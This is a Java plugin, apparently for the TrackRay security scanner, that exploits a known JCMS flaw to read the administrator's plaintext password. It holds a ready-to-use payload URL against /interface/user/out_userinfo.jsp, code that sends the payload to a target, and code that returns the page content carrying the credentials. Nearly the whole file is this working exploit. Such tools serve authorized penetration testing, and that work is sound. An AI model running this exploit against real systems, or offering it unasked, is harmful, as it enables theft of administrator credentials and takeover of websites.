package com.trackray.module.plugin.webapp.jcms;


import com.trackray.base.annotation.Plugin;
import com.trackray.base.annotation.Param;
import com.trackray.base.annotation.Rule;
import com.trackray.base.plugin.AbstractPlugin;
import com.trackray.base.plugin.CommonPlugin;

import java.util.Map;

@Rule(params = {@Param(key = "target", desc = "目标地址"),} , type = AbstractPlugin.Type.HTML)
@Plugin(title = "JCMS爆管理员明文密码 " , link = "http://www.anquan.us/static/bugs/wooyun-2015-095221.html", author = "浅蓝" )
public class PasswordRead extends CommonPlugin{
    String payload = "/interface/user/out_userinfo.jsp?xmlinfo=%3Cmain%3E%3Cstatus%3EQ%3C/status%3E%3C/main%3E";

    @Override
    public boolean check(Map param) {
        String target = param.get("target").toString();
        crawlerPage.getRequest().setUrl(target+payload);
        fetcher.run(crawlerPage);
        if (crawlerPage.getResponse().getStatus().getStatusCode()==200){
            return true;
        }else {
            return false;
        }
    }

    @Override
    public Object start() {
        return crawlerPage.getResponse().getStatus().getContentString();
    }
}
